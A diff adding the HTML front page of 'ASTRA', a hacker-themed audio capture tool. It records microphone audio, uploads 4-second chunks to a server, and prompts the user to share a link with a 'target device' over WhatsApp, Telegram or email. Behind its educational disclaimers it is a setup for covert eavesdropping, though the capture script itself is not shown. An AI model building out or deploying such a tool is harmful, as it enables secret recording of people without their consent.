@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ASTRA | Divine Audio Tool</title>
+<link rel="stylesheet" href="style.css">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<div class="scanlines"></div>
+
+<div class="container">
+
+  <!-- Boot Screen -->
+  <div id="bootScreen" class="boot-screen">
+    <pre class="boot-text" id="bootText"></pre>
+  </div>
+
+  <!-- Main Content -->
+  <div id="mainContent" class="main-content" style="display:none;">
+
+    <div class="terminal-header">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+      <span class="terminal-title">root@astra: ~/Astra [SECURE]</span>
+    </div>
+
+    <div class="terminal-body">
+
+      <pre class="ascii-banner">
+    _         _             
+   / \   ___| |_ _ __ __ _ 
+  / _ \ / __| __| '__/ _` |
+ / ___ \\__ \ |_| | | (_| |
+/_/   \_\___/\__|_|  \__,_|
+      </pre>
+
+      <p class="subtitle">[ ⚔️ DIVINE AUDIO CAPTURE TOOL v1.0 ⚔️ ]</p>
+
+      <div class="badges">
+        <span class="badge">⚡ Real-Time</span>
+        <span class="badge">🔒 Secure</span>
+        <span class="badge">💀 Hacker-Style</span>
+        <span class="badge">🎯 Educational</span>
+      </div>
+
+      <div class="warning">
+        ⚠️ <strong>EDUCATIONAL PURPOSE ONLY</strong> — Do not misuse.
+      </div>
+
+      <div class="tool-box">
+        <h2>⚔️ CAPTURE INTERFACE</h2>
+        <p>Click START to begin audio capture. Chunks upload automatically every 4 seconds.</p>
+
+        <div class="controls">
+          <button id="startBtn" class="btn">▶ START CAPTURE</button>
+          <button id="stopBtn" class="btn btn-red" disabled>■ STOP</button>
+        </div>
+
+        <div id="status" class="status">[ SYSTEM READY ]</div>
+
+        <div class="stats">
+          <div class="stat">
+            <span class="stat-label">CHUNKS</span>
+            <span class="stat-value" id="chunkCount">0</span>
+          </div>
+          <div class="stat">
+            <span class="stat-label">STATUS</span>
+            <span class="stat-value" id="liveStatus">IDLE</span>
+          </div>
+          <div class="stat">
+            <span class="stat-label">UPTIME</span>
+            <span class="stat-value" id="uptime">00:00</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- SHARE BOX -->
+      <div class="share-box">
+        <h2>🔗 SHARE THIS LINK</h2>
+        <p>Copy this link and share with your target device:</p>
+
+        <div class="link-display">
+          <input type="text" id="shareLink" value="" readonly>
+          <button id="copyBtn" class="btn-copy">📋 COPY</button>
+        </div>
+
+        <div class="share-buttons">
+          <a id="whatsappShare" class="share-btn whatsapp" target="_blank">📱 WhatsApp</a>
+          <a id="telegramShare" class="share-btn telegram" target="_blank">✈️ Telegram</a>
+          <a id="emailShare" class="share-btn email">📧 Email</a>
+        </div>
+
+        <p class="share-note">⚠️ Only share with your own devices or with explicit permission.</p>
+      </div>
+
+      <div class="features">
+        <h2>⚡ FEATURES</h2>
+        <div class="feature-grid">
+          <div class="feature">🎙️ Real-Time Audio Capture</div>
+          <div class="feature">📡 4-Second Chunks</div>
+          <div class="feature">🔐 Secure Upload</div>
+          <div class="feature">💾 Server Storage</div>
+          <div class="feature">📊 Live Stats</div>
+          <div class="feature">🎨 Hacker UI</div>
+        </div>
+      </div>
+
+      <div class="made-by">
+        <div class="made-by-text">⚔️ FORGED BY ⚔️</div>
+        <div class="author">KULDEEP</div>
+        <div class="tag">[ ETHICAL HACKER ]</div>
+        <div class="year">© 2026 ASTRA</div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
